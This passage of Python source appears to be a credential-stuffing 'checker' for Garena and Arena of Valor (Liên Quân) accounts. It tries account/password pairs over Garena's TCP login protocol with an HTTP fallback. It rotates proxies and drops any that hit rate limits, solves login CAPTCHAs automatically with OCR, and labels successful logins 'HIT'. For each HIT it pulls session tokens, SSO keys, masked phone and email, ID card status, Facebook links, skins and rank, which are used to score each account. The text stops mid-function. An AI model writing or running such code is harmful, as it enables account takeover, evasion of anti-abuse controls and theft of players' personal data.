                    v = nested.get(k)
                    if v is None:
                        continue
                    try:
                        n = int(v)
                    except (TypeError, ValueError):
                        continue
                    if 0 <= n <= 120:
                        return n
    return None


def _fetch_kientuong_player(sock, session_key: bytes, proxy=None) -> dict:
    """kientuong.lienquan.garena.vn: level, registerTime, banInfo, rank/stars."""
    if not HAS_REQUESTS:
        return {}
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, "https://kientuong.lienquan.garena.vn/auth/login/callback") +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        redir_raw = _proto_get(fields, 2, b'')
        redirect = redir_raw.decode('utf-8') if isinstance(redir_raw, bytes) else (str(redir_raw) if redir_raw else '')
        if not redirect:
            return {}
        sess = _get_http_session(proxy)
        # Follow redirects để cookie session kientuong được set đầy đủ
        try:
            sess.get(
                redirect,
                allow_redirects=True,
                verify=False,
                timeout=10,
                headers={"User-Agent": _random_android_browser_ua()},
            )
        except Exception:
            try:
                sess.get(redirect, allow_redirects=False, verify=False, timeout=8)
            except Exception:
                return {}
        if not sess.cookies:
            return {}

        player = {}
        player_status = ""
        raw_kt = {}
        # Thử vài path player API (site đôi khi đổi)
        for path in (
            "https://kientuong.lienquan.garena.vn/api/player/get",
            "https://kientuong.lienquan.garena.vn/api/player/info",
            "https://kientuong.lienquan.garena.vn/api/user/get",
        ):
            try:
                resp2 = sess.get(path, verify=False, timeout=8)
                if resp2.status_code != 200:
                    continue
                try:
                    raw_kt = resp2.json() or {}
                except Exception:
                    continue
                if not isinstance(raw_kt, dict):
                    continue
                player = (
                    raw_kt.get("player")
                    or raw_kt.get("data")
                    or raw_kt.get("user")
                    or {}
                )
                if isinstance(player, dict) and player:
                    player_status = (
                        raw_kt.get("playerStatus")
                        or raw_kt.get("status")
                        or ""
                    )
                    break
            except Exception:
                continue
        if not isinstance(player, dict) or not player:
            return {}

        import datetime
        reg_ts = player.get("registerTime") or player.get("register_time") or player.get("createTime")
        try:
            reg_ts = int(reg_ts or 0)
        except Exception:
            reg_ts = 0
        if reg_ts > 10_000_000_000:
            reg_ts //= 1000
        reg_str = _safe_fromtimestamp(reg_ts, "%H:%M:%S %d-%m-%Y") if reg_ts > 0 else ""

        # Rank name + stars (nhiều shape)
        rank_str = _deep_pick_rank_name(player)
        rank_stars_kt = _deep_pick_rank_stars(player)
        if not rank_stars_kt and rank_str:
            rank_stars_kt = _extract_rank_stars(rank_str, 0)

        ban_payload = [
            player.get("banInfo"),
            player.get("punishInfo"),
            player.get("punishment"),
            {
                "isBan": player.get("isBan"),
                "isBanned": player.get("isBanned"),
                "banned": player.get("banned"),
                "ban": player.get("ban"),
                "banStatus": player.get("banStatus"),
                "status": player.get("status"),
                "state": player.get("state"),
                "endTime": player.get("endTime"),
                "banEndTime": player.get("banEndTime"),
                "unbanTime": player.get("unbanTime"),
                "expireAt": player.get("expireAt"),
                "expiredAt": player.get("expiredAt"),
                "banTime": player.get("banTime"),
            },
        ]
        try:
            level = int(player.get("level") or player.get("roleLevel") or 0)
        except Exception:
            level = 0
        out = {
            "level": level,
            "register_time": reg_str,
            "banned": "YES" if _is_banned_info(ban_payload) else "NO",
            "rank": rank_str,
            "rank_stars": rank_stars_kt,
            "_raw_player": player,
            "_source": "kientuong",
        }
        # Điểm uy tín (credit score 0-100) — thử nhiều tên field nếu kientuong trả về
        _credit = _pick_credit_score(player, raw_kt)
        if _credit is not None:
            out["credit"] = _credit
        if player_status:
            out["player_status"] = str(player_status)
        # name LQ nếu có
        for nk in ("name", "roleName", "nickname", "nickName"):
            if player.get(nk) and isinstance(player.get(nk), str):
                out["name"] = player.get(nk).strip()
                break
        return out
    except Exception:
        pass
    return {}


# ── Core check ────────────────────────────────────────────────────────────────
_PROXY_ERRORS = (
    'Proxy closed connection',
    'Proxy CONNECT failed',
    'Proxy CONNECT response too large',
    'ProxyError',
    'Cannot connect to proxy',
    'Failed to establish a new connection',
    'SOCKS5',
    'socks5',
    'proxy rejected connection',
    'Tunnel connection failed',
    '407 Proxy Authentication Required',
    '403 Forbidden',
    'No connection could be made',
    'Connection dropped',
    'target machine actively refused',
    'A connection attempt failed',
    'connected party did not properly respond',
    'getaddrinfo failed',
    'Connection refused',
)

def _is_proxy_error(detail: str) -> bool:
    if not detail:
        return False
    return any(err in detail for err in _PROXY_ERRORS)


def _is_port_exhaustion(detail: str) -> bool:
    if not detail:
        return False
    return '10048' in detail or 'Only one usage' in detail


def _hit_info_score(h: dict) -> int:
    """Điểm đầy đủ info — dùng chọn best_hit khi recheck proxy."""
    if not isinstance(h, dict) or h.get("status") != "HIT":
        return -1
    s = 0
    if h.get("_acct_sec_ok"):
        s += 20
    if h.get("_tcp_acct_ok"):
        s += 3
    if _truthy_mask(h.get("masked_phone")) or _truthy_mask(h.get("aov_prefill_mobile")):
        s += 8
    if _truthy_mask(h.get("masked_email")):
        s += 8
    if int(h.get("email_v") or 0) > 0 or h.get("email_verified"):
        s += 3
    if h.get("password_set"):
        s += 4
    if h.get("fb_linked") or h.get("fb_uid"):
        s += 4
    if _truthy_mask(h.get("idcard")):
        s += 3
    if h.get("authenticator_enable") or h.get("two_step_verify"):
        s += 2
    sk = h.get("aov_skins") or {}
    if isinstance(sk, dict):
        if sk.get("_skins_ok") or sk.get("total_skins") is not None:
            s += 6
        try:
            s += min(int(sk.get("total_skins") or 0), 20)
        except Exception:
            pass
    if h.get("aov_name") or h.get("aov_rank"):
        s += 4
    try:
        s += min(int(h.get("aov_rank_stars") or 0), 15)
    except Exception:
        pass
    if h.get("aov_level"):
        s += 2
    if h.get("shells"):
        s += 1
    if h.get("login_history"):
        s += 2
    if not h.get("_info_fetch_incomplete"):
        s += 5
    return s


def _merge_hit_prefer(base: dict, newer: dict) -> dict:
    """
    Gộp 2 HIT: giữ field tốt nhất từ mỗi lần check (tránh mất SĐT/email/skin
    khi recheck proxy lần sau fail partial).
    """
    if not isinstance(base, dict):
        return dict(newer or {})
    if not isinstance(newer, dict):
        return dict(base)
    out = dict(base)
    # scalar prefer non-empty / higher
    prefer_keys = (
        "masked_phone", "masked_email", "idcard", "aov_prefill_mobile",
        "aov_name", "aov_rank", "aov_server", "nickname", "username",
        "sso_key", "session_token", "aov_access_token", "init_ip",
        "last_login", "last_login_best", "garena_created", "fb_uid",
        "fb_account_name", "country", "acc_country", "country_code", "region",
        "aov_reg_time", "last_session_ip", "last_session_country",
    )
    for k in prefer_keys:
        nv, ov = newer.get(k), out.get(k)
        if nv in (None, "", [], {}):
            continue
        if ov in (None, "", [], {}):
            out[k] = nv
        elif k in ("masked_phone", "masked_email", "aov_prefill_mobile", "idcard"):
            if _truthy_mask(nv) and (not _truthy_mask(ov) or len(str(nv)) > len(str(ov))):
                out[k] = nv
        elif k == "aov_rank":
            # giữ rank text dài hơn / có sao
            if len(str(nv)) > len(str(ov)):
                out[k] = nv
        else:
            if not ov:
                out[k] = nv

    # bool / flags: OR
    for k in ("password_set", "email_verified", "mobile_bound", "fb_linked",
              "account_secured", "_acct_sec_ok", "_tcp_acct_ok"):
        if newer.get(k) or out.get(k):
            out[k] = bool(newer.get(k) or out.get(k))

    # ints: max (không để 0 đè số thật)
    for k in ("email_v", "shells", "aov_level", "aov_rank_stars",
              "authenticator_enable", "two_step_verify", "suspicious"):
        try:
            ov = int(out.get(k) or 0)
            nv = int(newer.get(k) or 0)
            if nv > ov:
                out[k] = nv
                if k == "aov_rank_stars" and newer.get("aov_rank_source"):
                    out["aov_rank_source"] = newer.get("aov_rank_source")
            elif k not in out and newer.get(k) is not None:
                out[k] = nv
        except Exception:
            if newer.get(k) not in (None, "") and not out.get(k):
                out[k] = newer.get(k)

    # rank name: giữ base rõ; ưu tiên bản có stars cao hơn
    try:
        os_ = int(out.get("aov_rank_stars") or 0)
        ns_ = int(newer.get("aov_rank_stars") or 0)
    except Exception:
        os_, ns_ = 0, 0
    if newer.get("aov_rank") and (ns_ > os_ or not out.get("aov_rank")):
        out["aov_rank"] = _rank_base_name(newer.get("aov_rank")) or newer.get("aov_rank")
        if ns_ > 0:
            out["aov_rank_stars"] = ns_
        if newer.get("aov_rank_source"):
            out["aov_rank_source"] = newer.get("aov_rank_source")
    if newer.get("aov_rank_id") is not None and (ns_ >= os_ or out.get("aov_rank_id") is None):
        out["aov_rank_id"] = newer.get("aov_rank_id")

    # skins: prefer higher total_skins / _skins_ok — never let empty partial wipe
    sk_n = newer.get("aov_skins") if isinstance(newer.get("aov_skins"), dict) else {}
    sk_o = out.get("aov_skins") if isinstance(out.get("aov_skins"), dict) else {}
    if sk_n or sk_o:
        out["aov_skins"] = _merge_skins_prefer(sk_o, sk_n)

    for k in ("login_history", "sensitive_ops", "recent_games", "recent_game_names"):
        nv = newer.get(k)
        ov = out.get(k)
        if nv and (not ov or (isinstance(nv, list) and isinstance(ov, list) and len(nv) > len(ov))):
            out[k] = nv

    for k in ("_kgcamp_season", "_kgcamp_rank", "_kt_player", "_weekly_profile", "aov_max_rank"):
        nv = newer.get(k)
        ov = out.get(k)
        if nv and not ov:
            out[k] = nv
        elif isinstance(nv, dict) and isinstance(ov, dict):
            # Prefer non-empty dicts / more keys
            if len(nv) >= len(ov):
                merged_d = dict(ov)
                merged_d.update(nv)
                out[k] = merged_d

    # extra discovered keys: union
    for k in ("_extra_discovered", "_api_dump_paths"):
        nv, ov = newer.get(k), out.get(k)
        if isinstance(nv, dict) and isinstance(ov, dict):
            merged = dict(ov)
            merged.update(nv)
            out[k] = merged
        elif nv and not ov:
            out[k] = nv

    # incomplete flags: chỉ incomplete nếu CẢ HAI thiếu (và không có _acct_sec_ok)
    if out.get("_acct_sec_ok") or newer.get("_acct_sec_ok"):
        out["_acct_sec_ok"] = True
        out["_info_fetch_incomplete"] = False
        out["_needs_proxy_recheck"] = False
        out["_fetch_incomplete"] = False
    else:
        out["_info_fetch_incomplete"] = bool(
            out.get("_info_fetch_incomplete") and newer.get("_info_fetch_incomplete", True)
        )
        out["_fetch_incomplete"] = bool(out.get("_info_fetch_incomplete"))

    # status HIT sticky — never demote HIT → ERROR on partial recheck
    if out.get("status") == "HIT" or newer.get("status") == "HIT":
        out["status"] = "HIT"
    out["account"] = newer.get("account") or out.get("account")
    out["password"] = newer.get("password") or out.get("password")
    if newer.get("uid") and not out.get("uid"):
        out["uid"] = newer.get("uid")
    return out


def check_login(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False, acc_idx: int = -1) -> dict:
    result = None
    best_hit = None  # giữ HIT tốt nhất nếu recheck info nhiều lần
    proxy_fails = 0
    info_rechecks = 0
    no_proxy_mode = (proxy is None and not _proxy_list)
    if no_proxy_mode and not debug:
        timeout = min(timeout, _DIRECT_LOGIN_TIMEOUT)
    if _proxy_list:
        # Retry đủ dài: die proxy / fetch thiếu → loại proxy + xoay mới
        max_retries = max(6, min(max(len(_proxy_list), 6), 12))
    elif proxy is not None:
        max_retries = 3
    else:
        max_retries = max(_DIRECT_LOGIN_RETRIES, 2) if no_proxy_mode else 5

    def _drop_proxy(p, reason: str = ""):
        """Loại proxy hỏng khỏi pool (die/error/fetch thiếu)."""
        if p and _proxy_list:
            _mark_proxy_bad(p, reason or "proxy_bad")

    for _retry in range(max_retries):
        if _proxy_list:
            # Prefer assigned live proxy; fall back to deck rotation on later retries
            if _retry == 0:
                proxy = _pick_live_proxy(acc_idx if acc_idx >= 0 else 0, max_scan=12)
            else:
                proxy = (
                    _proxy_fallback_for_account(acc_idx if acc_idx >= 0 else 0, _retry)
                    or _pick_live_proxy(acc_idx if acc_idx >= 0 else _retry, max_scan=15)
                    or _next_proxy()
                )
            if proxy is None:
                result = {
                    "account": account, "password": password,
                    "status": "PROXY_FAIL",
                    "detail": "Khong co proxy nao con song trong list",
                }
                if best_hit:
                    return best_hit
        elif proxy is None:
            proxy = _next_proxy() if _proxy_list else None

        result = _check_login_once(account, password, timeout, fetch_info, proxy, debug=debug, acc_idx=acc_idx)
        detail = result.get('detail', '') or ''
        status = result.get('status', '') or ''

        if status == 'HIT':
            # merge vào best_hit (không mất field tốt từ lần trước)
            if best_hit is None:
                best_hit = dict(result)
            else:
                best_hit = _merge_hit_prefer(best_hit, result)
                if not _needs_info_recheck(best_hit) and _hit_info_score(best_hit) >= _hit_info_score(result):
                    result = best_hit

            # Fetch thiếu / block → LOẠI proxy + retry proxy mới
            if fetch_info and _needs_info_recheck(result) and _proxy_list and _retry < max_retries - 1:
                info_rechecks += 1
                _drop_proxy(proxy, 'info_fetch_incomplete_or_blocked')
                if debug:
                    result.setdefault('debug', {})['info_recheck'] = info_rechecks
                    result.setdefault('debug', {})['info_score'] = _hit_info_score(result)
                    result.setdefault('debug', {})['dropped_proxy'] = str(_proxy_key(proxy) if proxy else '')
                time.sleep(0.35 * min(info_rechecks, 3))
                continue
            # HIT đủ info (hoặc hết proxy/retry)
            if not _needs_info_recheck(result):
                _mark_proxy_good(proxy)
            if best_hit and _hit_info_score(best_hit) > _hit_info_score(result):
                return best_hit
            # còn incomplete nhưng hết retry → trả best_hit đã merge
            if best_hit:
                return _merge_hit_prefer(best_hit, result)
            return result

        # CAPTCHA / rate-limit: loại proxy, xoay
        if 'result=3' in detail or status == 'CAPTCHA':
            _drop_proxy(proxy, detail or status)
            if _proxy_list and _retry < max_retries - 1:
                proxy_fails += 1
                time.sleep(0.25 * (_retry + 1))
                continue
            return best_hit or result

        # 101/105/174 = acc identity — không phải lỗi proxy
        if any(c in detail for c in ('result=101', 'result=105', 'result=174')):
            return result

        if _is_port_exhaustion(detail):
            _drop_proxy(proxy, detail)
            proxy_fails += 1
            time.sleep(0.3)
            continue

        if status == 'TIMEOUT' and no_proxy_mode:
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
            return best_hit or result

        # ERROR / TIMEOUT / proxy lỗi → loại proxy, xoay proxy mới
        if status in ('ERROR', 'TIMEOUT', 'PROXY_FAIL') or _is_proxy_error(detail):
            proxy_fails += 1
            _drop_proxy(proxy, detail or status)
            if _proxy_list and _retry < max_retries - 1:
                time.sleep(0.25 * min(proxy_fails, 3))
                continue
            return best_hit or result

        if detail == 'Empty LoginReply data':
            _drop_proxy(proxy, detail)
            if _proxy_list and _retry < max_retries - 1:
                proxy_fails += 1
                continue
            return best_hit or result

        # INVALID / NOT_FOUND / BANNED / MISS thật → giữ proxy (không phải proxy die)
        if status in ('INVALID', 'NOT_FOUND', 'BANNED', 'SEC_BANNED', 'MISS'):
            _mark_proxy_good(proxy)
        return result

    if best_hit:
        if result and result.get('status') == 'HIT':
            return _merge_hit_prefer(best_hit, result)
        return best_hit

    if result:
        if no_proxy_mode and result.get('status') == 'TIMEOUT':
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
        elif proxy_fails >= 3 and result.get('status') != 'HIT':
            result['status'] = 'PROXY_FAIL'
            result['detail'] = f'proxy_error x{proxy_fails}'
    return result


def _check_login_once(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False, acc_idx: int = -1) -> dict:
    global _HOST_IP
    _begin_check_context(account, password, acc_idx)
    # Acquire connection slot — giai phong tu dong khi ham ket thuc
    _conn_sem.acquire()
    sock = None
    dbg = {}
    try:
        host_ip = _resolve_host_ip()
        if proxy:
            sock, host_ip = _connect_garena_via_proxy(proxy, timeout)
            if debug:
                dbg["connect_via"] = host_ip
        else:
            # Retry toi da 3 lan neu bi WinError 10048 (Windows het ephemeral port)
            direct_attempts = _DIRECT_CONNECT_ATTEMPTS if not _proxy_list else 3
            for _attempt in range(direct_attempts):
                sock = None
                try:
                    sock = _make_fast_socket(timeout)
                    sock.connect((host_ip, PORT))
                    break  # ket noi thanh cong
                except OSError as _e:
                    if sock:
                        try:
                            sock.close()
                        except Exception:
                            pass
                        sock = None
                    if getattr(_e, 'winerror', None) == 10048 and _attempt < direct_attempts - 1:
                        time.sleep(0.5 * (_attempt + 1))
                        continue
                    raise

        # Step 1: CMD_LOGIN_PREPARE (256)
        rand_key  = os.urandom(16)
        prep_body = _build_login_prepare(account, rand_key)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5, timeout=_TCP_CMD_TIMEOUT)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({
                "prepare_result": result_code,
                "prepare_body_len": len(body) if body else 0,
            })
        if result_code != 0:
            # Ánh xạ mã lỗi từ GxxData.Constant.Result (login/d.java AnonymousClass8)
            # 1=ERROR_AUTH(sai pass), 2=ACCOUNT_NOT_EXIST, 3=ERROR_CAPTCHA(rate-limit),
            # 4=ERROR_AUTH_USER_BAN, 5=ERROR_AUTH_SECURITY_BAN
            
            if result_code == 3:
                # Thu giai CAPTCHA tu dong bang ddddocr truoc khi fallback HTTP
                # Cho phep thu giai toi da 3 lan voi anh moi moi lan
                for attempt_solve in range(3):
                    ckey, ctext = _solve_garena_captcha(proxy_dict=_get_http_proxies(proxy))
                    if ckey and ctext:
                        # Garena CAPTCHA thuong 5-6 ky tu. Neu ddddocr tra ve qua ngan (<5), bo qua lay anh khac.
                        if len(ctext) < 5:
                            if debug:
                                dbg[f"tcp_captcha_attempt_{attempt_solve}_short"] = ctext
                            continue
                            
                        if debug: dbg[f"tcp_captcha_solve_attempt_{attempt_solve}"] = ctext
                        
                        # Gui lai LOGIN_PREPARE voi captcha
                        prep_body = _build_login_prepare(account, rand_key, captcha_key=ckey, captcha=ctext)
                        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))
                        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5, timeout=_TCP_CMD_TIMEOUT)
                        result_code = hdr.get(5, 0)
                        
                        if debug: dbg[f"tcp_captcha_solve_result_{attempt_solve}"] = result_code
                        
                        if result_code == 0:
                            break # Thanh cong!
                        elif result_code != 3:
                            break # Loi khac (sai pass, ban, v.v.) -> thoat de xu ly ben duoi
                    else:
                        break # Khong lay duoc anh hoac loi OCR -> thoat
                
                # Neu thanh cong (result=0), tiep tuc luong binh thuong vao Step 2
                # Neu van failure (!=0), se thuc hien fallback HTTP ben duoi

            if result_code != 0:
                http_r = {}
                # CAPTCHA (3) hoặc GXX identity reject (101/105/174) → thử HTTP SSO
                # (chưa check pass trên TCP; SSO có thể vẫn login được)
                if result_code in _PREPARE_HTTP_FALLBACK_CODES and HAS_REQUESTS:
                    if debug:
                        dbg["prepare_http_fallback"] = result_code
                    http_r = _http_login_garena(account, password, proxy=proxy, timeout=timeout)
                    # HIT khi có access_token (AoV) HOẶC session_key (Account Center)
                    if http_r.get('access_token') or http_r.get('session_key'):
                        out = {
                            "account": account, "password": password,
                            "status": "HIT", "_login_method": "http",
                            "aov_token": http_r.get("access_token") or "",
                        }
                        if http_r.get("session_key"):
                            out["_http_session_key"] = http_r["session_key"]
                        if http_r.get("uid") and not out.get("uid"):
                            out["uid"] = http_r.get("uid")
                        if fetch_info:
                            out = _enrich_http_hit(out, http_r, proxy=proxy)
                        if debug:
                            dbg["http_fallback_ok"] = True
                            out["debug"] = dbg
                        return out
                    err_code = str(http_r.get('error_code', '') or '')
                    err_msg = str(http_r.get('error', '') or '')
                    if err_code in ('invalid_grant', 'access_denied', 'error_auth') or 'password' in err_msg.lower():
                        out = {"account": account, "password": password,
                               "status": "INVALID",
                               "detail": f"TCP_PREPARE={result_code} HTTP_SAI_PASS ({err_code or err_msg})"}
                    elif err_code in ('account_not_exist', 'error_account_not_exist') or result_code in _PREPARE_SKIP_CODES:
                        # TCP 105 + HTTP cũng không có acc → username không tồn tại / không phải Garena
                        out = {
                            "account": account, "password": password,
                            "status": "NOT_FOUND" if result_code in (2,) or err_code == 'account_not_exist' else "MISS",
                            "detail": (
                                f"PREPARE result={result_code}: GXX từ chối username "
                                f"(chưa check mật khẩu). HTTP: {err_code or err_msg or 'fail'}. "
                                f"Thường là acc không tồn tại / đã xóa / không phải Garena GXX."
                            ),
                        }
                    elif result_code == 3:
                        out = {"account": account, "password": password,
                               "status": "CAPTCHA",
                               "detail": f"TCP_CAPTCHA HTTP_ERR={err_msg or err_code}"}
                    else:
                        out = {"account": account, "password": password,
                               "status": "MISS",
                               "detail": f"PREPARE result={result_code} HTTP_ERR={err_msg or err_code}"}
                    if debug:
                        dbg["http_fallback_err"] = http_r
                        out["debug"] = dbg
                    return out

                # Các lỗi khác (sai pass, ban, không tìm thấy, …) — không fallback HTTP
                status_map = {
                    1: ("INVALID",    f"WRONG_PASSWORD result={result_code}"),
                    2: ("NOT_FOUND",  f"ACCOUNT_NOT_EXIST result={result_code}"),
                    3: ("CAPTCHA",    f"PREPARE_CAPTCHA result={result_code}"),
                    4: ("BANNED",     f"USER_BANNED result={result_code}"),
                    5: ("SEC_BANNED", f"SECURITY_BANNED result={result_code}"),
                    101: ("MISS", "PREPARE result=101: username không hợp lệ trên GXX (chưa check pass)"),
                    105: ("MISS", "PREPARE result=105: GXX không nhận username (acc không tồn tại/đã xóa/không phải Garena — chưa check pass)"),
                    174: ("MISS", "PREPARE result=174: GXX từ chối identity (chưa check pass)"),
                }
                status, detail = status_map.get(
                    result_code,
                    ("MISS", f"PREPARE_FAIL result={result_code}"),
                )
                out = {"account": account, "password": password, "status": status, "detail": detail}
                if debug:
                    out["debug"] = dbg
                return out

            # result_code == 0: CAPTCHA da giai thanh cong hoac khong bi CAPTCHA → tiep tuc Step 2

        prep_reply = _proto_decode(body)
        reply_key  = _proto_get(prep_reply, 1, b'')
        reply_data = _proto_get(prep_reply, 2, b'')
        if debug:
            dbg.update({
                "prepare_has_key": bool(reply_key),
                "prepare_has_data": bool(reply_data),
                "prepare_key_len": len(reply_key) if isinstance(reply_key, (bytes, bytearray)) else 0,
                "prepare_data_len": len(reply_data) if isinstance(reply_data, (bytes, bytearray)) else 0,
            })
        if not reply_key or not reply_data:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "Empty LoginPrepareReply"}
            if debug:
                out["debug"] = dbg
            return out

        prep_data   = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt        = _proto_get(prep_data, 1, b'')
        verify_code = _proto_get(prep_data, 2, b'')
        salt        = salt.decode('utf-8')        if isinstance(salt,        bytes) else salt
        verify_code = verify_code.decode('utf-8') if isinstance(verify_code, bytes) else verify_code
        if debug:
            dbg.update({
                "salt_len": len(salt) if isinstance(salt, str) else 0,
                "verify_len": len(verify_code) if isinstance(verify_code, str) else 0,
            })

        # Step 2: CMD_LOGIN (257)
        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, max_tries=5, timeout=_TCP_CMD_TIMEOUT)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({
                "login_result": result_code,
                "login_body_len": len(body) if body else 0,
            })
        if result_code != 0:
            out = {"account": account, "password": password,
                   "status": "INVALID", "detail": f"LOGIN_FAIL result={result_code}"}
            if debug:
                out["debug"] = dbg
            return out

        login_reply = _proto_decode(body)
        enc_reply   = _proto_get(login_reply, 1, b'')
        if debug:
            dbg.update({
                "login_has_enc": bool(enc_reply),
                "login_enc_len": len(enc_reply) if isinstance(enc_reply, (bytes, bytearray)) else 0,
            })
        if not enc_reply:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "Empty LoginReply data"}
            if debug:
                out["debug"] = dbg
            return out

        reply_decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid           = _proto_get(reply_decoded, 1, 0)
        session_key   = _proto_get(reply_decoded, 2, b'')
        if debug:
            dbg.update({
                "uid": uid,
                "session_key_len": len(session_key) if isinstance(session_key, (bytes, bytearray)) else 0,
            })

        if not uid:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "UID=0 in reply"}
            if debug:
                out["debug"] = dbg
            return out

        result = {
            "account": account, "password": password, "status": "HIT",
            "uid": uid,
            "session_key": session_key.hex() if isinstance(session_key, bytes) else "",
        }
        if debug:
            result["debug"] = dbg

        # ── Post-login: fetch extra info ──
        # Login đã OK → mọi lỗi fetch info chỉ làm partial HIT, không đổi status ERROR
        if fetch_info and isinstance(session_key, bytes) and len(session_key) == 16:
          try:
            try:
                sock.settimeout(_INFO_FETCH_TIMEOUT)
            except Exception:
                pass

            # ── Phase 1: TCP commands (sequential, same socket) ──
            # CRITICAL ORDER: sso_key / session_token FIRST.
            # CMD 342 (account info) often never replies and used to burn the
            # socket timeout → sso_key empty → Email/SĐT always "No".
            try:
                sock.settimeout(_INFO_FETCH_TIMEOUT)
            except Exception:
                pass

            # INFO_FETCH_ORDER: sso/session tokens FIRST (tránh CMD 342 block → mất Email/SĐT)
            result['_info_fetch_order'] = list(INFO_FETCH_ORDER)
            sso = _fetch_sso_key_with_retry(sock, session_key)
            sso_key = (sso.get('sso_key', '') or '').strip()
            if sso_key:
                result['sso_key'] = sso_key
            try:
                if sso:
                    extra_dump_and_search("tcp_sso_key", sso, meta={"acc": account})
            except Exception:
                pass

            sess_tok = _fetch_session_token(sock, session_key)
            session_token = (sess_tok.get('session_token', '') or '').strip()
            if session_token:
                result['session_token'] = session_token

            _pool = _ensure_http_pool()
            _futs = {}
            # Account security ASAP — uses sso_key (and 278 token) as session_key
            alt_keys = [session_token] if session_token else []
            acct_sec = _fetch_account_security(
                sso_key, proxy, account=account, password=password, alt_keys=alt_keys,
            )
            _apply_acct_sec(result, acct_sec)
            result['_acct_sec_ok'] = bool(acct_sec)
            try:
                if acct_sec:
                    disc = extra_dump_and_search(
                        "account_security",
                        acct_sec,
                        known_fields={
                            "masked_phone", "masked_email", "idcard", "email_v",
                            "authenticator_enable", "two_step_verify", "password_set",
                            "login_history", "country", "country_code", "shell",
                        },
                        meta={"acc": account},
                    )
                    if disc.get("extra_keys"):
                        result.setdefault("_extra_discovered", {}).update(disc["extra_keys"])
                        apply_extra_discovered_fields(result, disc["extra_keys"])
            except Exception:
                pass
            if sso_key:
                _futs['uac'] = _pool.submit(_fetch_uac_country, sso_key, proxy)
            if session_token:
                _futs['recent_games'] = _pool.submit(_fetch_recent_games, session_token, proxy)

            # Remaining TCP info (best-effort) — NON-DESTRUCTIVE (không đè 0/'' lên field tốt)
            login_info = _fetch_login_info(sock, session_key) or {}
            try:
                if login_info:
                    extra_dump_and_search("tcp_login_info", login_info, meta={"acc": account})
            except Exception:
                pass
            if login_info.get('region'):
                result['region'] = _prefer_str_field(result.get('region'), login_info.get('region'))
            if login_info.get('shells') is not None:
                result['shells'] = _prefer_max_int(result.get('shells'), login_info.get('shells'))
            if login_info.get('topup_time'):
                result['topup_time'] = login_info.get('topup_time') or result.get('topup_time')
            ll = login_info.get('last_login', 0)
            if ll:
                s = _safe_fromtimestamp(ll, '%Y-%m-%d %H:%M:%S')
                if s:
                    result['last_login'] = s
            ct = login_info.get('created_time', 0)
            if ct:
                s = _safe_fromtimestamp(ct, '%H:%M:%S %d-%m-%Y')
                if s:
                    result['garena_created'] = s
            if login_info.get('fb_uid_login'):
                result['fb_uid'] = login_info['fb_uid_login']
                result['fb_linked'] = True
            if login_info.get('fb_link_time'):
                s = _safe_fromtimestamp(login_info['fb_link_time'], '%d-%m-%Y')
                if s:
                    result['fb_link_time'] = s
            if login_info.get('last_session_ip'):
                result['last_session_ip'] = login_info['last_session_ip']
            if login_info.get('last_session_country'):
                result['last_session_country'] = login_info['last_session_country']
            if login_info.get('last_session_time'):
                s = _safe_fromtimestamp(login_info['last_session_time'], '%d-%m-%Y %H:%M')
                if s:
                    result['last_session_time'] = s

            basic = _fetch_user_basic(sock, uid, session_key) or {}
            if basic.get('username'):
                result['username'] = _prefer_str_field(result.get('username'), basic.get('username'))
            if basic.get('nickname'):
                result['nickname'] = _prefer_str_field(result.get('nickname'), basic.get('nickname'))

            # CMD 342: merge OR — không hạ True → False nếu init đã có
            acct = _fetch_account_info_with_retry(sock, session_key)
            if acct:
                if acct.get('password_set'):
                    result['password_set'] = True
                if acct.get('email_verified'):
                    result['email_verified'] = True
                if acct.get('mobile_bound'):
                    result['mobile_bound'] = True
                if acct.get('account_secured'):
                    result['account_secured'] = True
            # Infer TCP-style flags from account/init when CMD 342 missing/partial
            if result.get('_acct_sec_ok') or _truthy_mask(result.get('masked_phone')):
                if _truthy_mask(result.get('masked_phone')):
                    result['mobile_bound'] = True
                if int(result.get('email_v') or 0) > 0 or _truthy_mask(result.get('masked_email')):
                    if int(result.get('email_v') or 0) > 0:
                        result['email_verified'] = True
            result['_tcp_acct_ok'] = bool(acct)

            fb = _fetch_fb_info(sock, session_key)
            if fb.get('fb_linked'):
                result['fb_linked'] = True
            uid = _normalize_fb_uid(fb.get('fb_uid'))
            if uid:
                result['fb_uid'] = uid
                result['fb_linked'] = True
            # Gộp FB uid từ login_info / account init / CMD 467
            _finalize_fb_fields(result)

            # AoV OAuth token (for weekly/aov_info HTTP APIs)
            oauth = _fetch_oauth_token(sock, session_key, LIEN_QUAN_APP_ID)
            aov_token = oauth.get('access_token', '')
            aov_open_id = str(oauth.get('open_id') or '').strip()
            if aov_token:
                result['aov_access_token'] = aov_token
            if aov_open_id:
                result['aov_open_id'] = aov_open_id
            # AoV redirect URL (code flow) for sale.lienquan.garena.vn — multi URI
            sale_redirect = _get_app_redirect_url_retry(sock, session_key)
            if sale_redirect:
